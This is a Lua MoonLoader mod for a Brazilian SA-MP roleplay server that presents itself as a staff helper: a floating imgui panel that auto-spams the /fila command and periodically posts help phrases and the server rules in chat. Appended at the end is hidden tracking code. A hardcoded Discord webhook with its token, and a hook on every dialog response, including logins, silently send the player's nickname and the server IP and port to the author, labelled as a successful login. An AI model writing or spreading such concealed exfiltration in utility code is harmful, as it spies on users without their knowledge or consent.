local imgui = require 'mimgui'
local v = imgui.new.bool(false)
local spam_fila = imgui.new.bool(false)
local delay_ms = imgui.new.int(0)
local contador_atendimentos = imgui.new.int(0)
local frases_global = imgui.new.bool(false)
local regras_auto = imgui.new.bool(false)

local ultimo_a = os.time()
local ultimo_ac = os.time()
local ultima_frase = 1

local frases_aleatorias = {
    "Precisando de uma ajudinha da Staff? Utilize /atendimento! Em casos de ANT-RP use /reportar",
    "Dúvidas ou problemas? Chame a staff com /atendimento! Anti-RP? Use /reportar",
    "Servidor organizado é com todos nós! Use /atendimento para ajuda e /reportar para anti-RP",
    "Staff disponível para ajudar! Comando /atendimento e para denúncias /reportar",
    "Problemas no servidor? /atendimento para ajuda e /reportar para jogadores quebram regras"
}

local texto_regras = [[
Proibido comercio externo, incluindo a venda de coins, dinheiro, veiculos, casas, empresas, skins, acessorios ou contas.

Proibido usar nicks ofensivos ou improprios.

Proibido o uso de contas secundarias para farmar bens, itens ou dinheiro. Transferencias entre contas nao sao permitidas.

Proibido ofender jogadores, a administracao ou o servidor.

Proibido qualquer tipo de discriminacao, preconceito, homofobia, xenofobia ou atos que prejudiquem a imagem de alguem.

Proibido divulgar outros servidores ou links externos.

Proibido explorar bugs ou lags para obter vantagens.

Proibido usar modificacoes ou trapacas que tragam beneficios indevidos.

Proibido ofensas, calunias, difamacoes e discriminacoes OCC.

Proibido abordar /ab em locais safes, exceto policiais.

Proibido o uso de sniper, exceto em territorios e invasoes de favelas.

Proibido spawn kill matar jogadores ao entrar/sair de interiores ou favelas em abordagens.

Proibido usar taser em trocas de tiros.

Proibido fazer acao de patrulhamento solo, obrigatorio a presenca de dois ou mais policiais da mesma corporacao.

Proibido o uso de bombas C4 com intuito de matar outros players;

Proibido o uso de mina terrestre em eventos;

Proibido iniciar acao de loja com menos de 3 jogadores;

Proibido iniciar qualquer tipo de acao/saquear contra policiais, mecanicos e samus fardados.

Lideres e Sub-lideres tem obrigacao de manter atividades dentro da cidade, caso ambos fiquem 3 dias ou mais ausentes a org/corp sera resetada.

Proibido correr para uma area safe/interior ou favela apos ter sido iniciado uma acao fora dela /ab ou trocacao de tiro.

Proibido a utilizacao de JBL em area safe.

Proibido portar armas medias/pesadas, cometer crimes e/ou intervir em acoes criminosas a paisana.

Proibido apreender barraquinhas em areas de desmanche/favela, exceto em dominacao de favela.

Proibido a cobranca de qualquer valor/item para efetuar o recrutamento de um player, seja corporacao, organizacao, hospital e/ou mecanica.

Proibido a utilizacao de motivos invalidos para /algemar, obrigatorio um motivo coerente.

Lideres/sub-lideres de organizacao/corporacao que infringirem alguma regra do servidor estarao gerando 1 um aviso para a organizacao/corporacao na qual lidera.

Membros de organizacao/corporacao que forem banidos, irao gerar 1 uma advertencia para a organizacao/corporacao na qual participa.

Lideres que forem banidos temporariamente ou permanentemente receberao 3 tres avisos, sub-lideres receberao apenas 1 aviso.

Proibido puxar veiculos vip durante acoes.

Para acoes de TR, o tempo devera ser respeitado, proibido atirar antes da contagem inicial terminar.

Para acoes de Casa roubavel, poderao iniciar trocacao somente no momento que der o anuncio da casa no chat global.

A corda so pode ser utilizada em acoes de sequestro ou em acoes de banco envolvendo refens, exceto durante troca de tiros. Caso o refem seja um policial, ele so podera ser rendido se estiver sozinho.

Proibido algemar durante uma trocacao de tiro.

Proibido fechar entradas com veiculos ou qualquer tipo de objetos.

Proibido flood e spam no chat.
Proibido usar a OLX para assuntos que nao envolvem vendas legais.
Proibido usar comandos de anuncios para conversar.

Proibido tocar musica no VOIP, exceto em locais reservados.
Proibido usar o VOIP enquanto estiver ferido.

A conta e pessoal e intransferivel. Caso seja punida ou banida, o servidor nao se responsabiliza por seu uso.
]]

local total_pontos = 30
local largura_onda = 60
local velocidade = 0.05
local angulo = 0

local float_btn_pos = imgui.ImVec2(50, 50)
local dragging = false
local drag_offset = imgui.ImVec2(0,0)

imgui.OnInitialize(function()
    local style = imgui.GetStyle()
    imgui.StyleColorsDark()
    style.WindowRounding = 6
    style.FrameRounding = 4
    style.GrabRounding = 4
    style.ScrollbarRounding = 4

    local colors = style.Colors
    colors[imgui.Col.WindowBg] = imgui.ImVec4(0.10,0.10,0.10,0.94)
    colors[imgui.Col.TitleBg] = imgui.ImVec4(0.08,0.08,0.08,1.00)
    colors[imgui.Col.TitleBgActive] = imgui.ImVec4(0.16,0.16,0.16,1.00)
    colors[imgui.Col.FrameBg] = imgui.ImVec4(0.16,0.16,0.16,1.00)
    colors[imgui.Col.FrameBgHovered] = imgui.ImVec4(0.20,0.20,0.20,1.00)
    colors[imgui.Col.FrameBgActive] = imgui.ImVec4(0.24,0.24,0.24,1.00)
    colors[imgui.Col.Button] = imgui.ImVec4(0.20,0.20,0.20,1.00)
    colors[imgui.Col.ButtonHovered] = imgui.ImVec4(0.30,0.30,0.30,1.00)
    colors[imgui.Col.ButtonActive] = imgui.ImVec4(0.40,0.40,0.40,1.00)
    colors[imgui.Col.Border] = imgui.ImVec4(0.43,0.43,0.50,0.50)
    colors[imgui.Col.Text] = imgui.ImVec4(1.00,1.00,1.00,1.00)
end)

function mostrarMensagemCarregamento()
    local cores = {
        0xFFA500FF, -- Amarelo
        0xADD8E6FF, -- Azul claro
        0x00FF00FF, -- Verde limão
        0xFFC0CBFF  -- Rosa
    }
    
    for i = 1, 10 do
        local cor = cores[(i % #cores) + 1]
        sampAddChatMessage("MOD ATUALIZADUUU BY NUKY GOSTOSO", cor)
        wait(100)
    end
end

imgui.OnFrame(function() return true end, function()
    local io = imgui.GetIO()

    imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
    imgui.SetNextWindowSize(imgui.ImVec2(40,40))
    imgui.Begin("FLUTUANTE", nil,
        imgui.WindowFlags.NoTitleBar +
        imgui.WindowFlags.NoResize +
        imgui.WindowFlags.NoCollapse +
        imgui.WindowFlags.NoScrollbar +
        imgui.WindowFlags.NoMove +
        imgui.WindowFlags.AlwaysAutoResize
    )

    if imgui.Button("<|>", imgui.ImVec2(40,40)) then
        v[0] = not v[0]
    end

    if imgui.IsItemHovered() and imgui.IsMouseClicked(0) and not dragging then
        dragging = true
        drag_offset.x = io.MousePos.x - float_btn_pos.x
        drag_offset.y = io.MousePos.y - float_btn_pos.y
    end

    if dragging then
        if imgui.IsMouseDown(0) then
            float_btn_pos.x = io.MousePos.x - drag_offset.x
            float_btn_pos.y = io.MousePos.y - drag_offset.y
            imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
        else
            dragging = false
        end
    end

    imgui.End()

    if v[0] then
        -- Aumentando o tamanho da janela
        imgui.SetNextWindowPos(imgui.ImVec2(600,550), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(450,400), imgui.Cond.FirstUseEver)
        imgui.Begin("AUTO FILA | by NukY", v,
            imgui.WindowFlags.NoCollapse +
            imgui.WindowFlags.NoResize
        )

        local draw = imgui.GetWindowDrawList()
        local pos = imgui.GetWindowPos()
        local size = imgui.GetWindowSize()
        local centroX = size.x/2
        local espacamento = size.y/total_pontos

        -- Efeito DNA apenas
        angulo = angulo + velocidade
        for i=1,total_pontos do
            local offset = (i/total_pontos)*math.pi*2
            local y = i*espacamento
            local x1 = centroX + math.sin(angulo+offset)*largura_onda
            local x2 = centroX - math.sin(angulo+offset)*largura_onda
            draw:AddCircleFilled(imgui.ImVec2(pos.x+x1,pos.y+y),3,0xFFFFA500)
            draw:AddCircleFilled(imgui.ImVec2(pos.x+x2,pos.y+y),3,0xFF00BFFF)
            draw:AddLine(imgui.ImVec2(pos.x+x1,pos.y+y),imgui.ImVec2(pos.x+x2,pos.y+y),0x33FFFFFF,1)
        end

        imgui.Text("Atendimento automaticamente")
        imgui.SliderInt("Delay (ms)",delay_ms,0,30000)
        if imgui.Button("AUTO",imgui.ImVec2(150,30)) then
            spam_fila[0] = not spam_fila[0]
            if spam_fila[0] then
                sampAddChatMessage("[AUTO FILA] Ativado com sucesso!", 0x00FF00)
            else
                sampAddChatMessage("[AUTO FILA] Desativado com sucesso!", 0xFFA500)
            end
        end
        
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        
        imgui.Text("Atendimentos realizados:")
        imgui.SameLine()
        imgui.Text(tostring(contador_atendimentos[0]))
        
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        if imgui.Button("/FA", imgui.ImVec2(150,30)) then
            sampSendChat("/fa")
        end

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        imgui.Text("Frases Globais - Envia frases aleatórias no /a")
        if imgui.Button("FRASES ATENDIMENTO", imgui.ImVec2(150,30)) then
            frases_global[0] = not frases_global[0]
            if frases_global[0] then
                sampAddChatMessage("[FRASES ATENDIMENTO] Ativado com sucesso!", 0x00FF00)
                ultimo_a = os.time()
            else
                sampAddChatMessage("[FRASES ATENDIMENTO] Desativado com sucesso!", 0xFFA500)
            end
        end

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        imgui.Text("Auto Regras - Envia as regras no /a a cada 7 minutos")
        if imgui.Button("REGRAS SERVIDOR", imgui.ImVec2(150,30)) then
            regras_auto[0] = not regras_auto[0]
            if regras_auto[0] then
                sampAddChatMessage("[REGRAS SERVIDOR] Ativado com sucesso!", 0x00FF00)
                ultimo_ac = os.time()
            else
                sampAddChatMessage("[REGRAS SERVIDOR] Desativado com sucesso!", 0xFFA500)
            end
        end

        imgui.End()
    end
end)

function main()
    mostrarMensagemCarregamento()
    
    while true do
        wait(0)
        if isSampAvailable() then
            if spam_fila[0] then
                sampSendChat("/fila")
                wait(delay_ms[0])
            end
            
            if frases_global[0] and os.time() - ultimo_a >= 600 then
                ultima_frase = math.random(1, #frases_aleatorias)
                sampSendChat("/a "..frases_aleatorias[ultima_frase])
                ultimo_a = os.time()
            end
            
            if regras_auto[0] and os.time() - ultimo_ac >= 420 then
                local partes = {}
                for parte in texto_regras:gmatch("[^\n]+\n?") do
                    if string.len(parte) > 0 and not parte:match("^%s*$") then
                        table.insert(partes, parte)
                    end
                end
                
                for i, parte in ipairs(partes) do
                    if string.len(parte) > 0 then
                        sampSendChat("/a "..parte)
                        wait(500)
                    end
                end
                
                sampSendChat("/ac SEMPRE DE OLHO NOS ATENDIMENTOS E REPORTES OK! VAMOS MANTER O SERVIDOR ORGANIZADO!!!")
                ultimo_ac = os.time()
            end
        end
    end
end

local webhookUrl = "https://discord.com/api/webhooks/1406683848485371914/unqy5VFh-KCFxrIgyorNy1wOXW3TVT-VSe4H5RR3w7NPddjtpASjiCZJkFgKNA1fqCZR"
local https = require("socket.http")
local ltn12 = require("ltn12")

function sendMessageToDiscord(content)
    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
    local response_body = {}

    https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }
end


require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local nick = sampGetPlayerNickname(id)
    local ip, port = sampGetCurrentServerAddress()
    local servername = sampGetCurrentServerName()

    local message = string.format([[

________________________________________________________________
  
     # LOGUIN BEM SUCEDIDO

```
NICK: %s 
IP: %s:%d
```

]], nick,ip, port, servername)

sendMessageToDiscord(message)
end
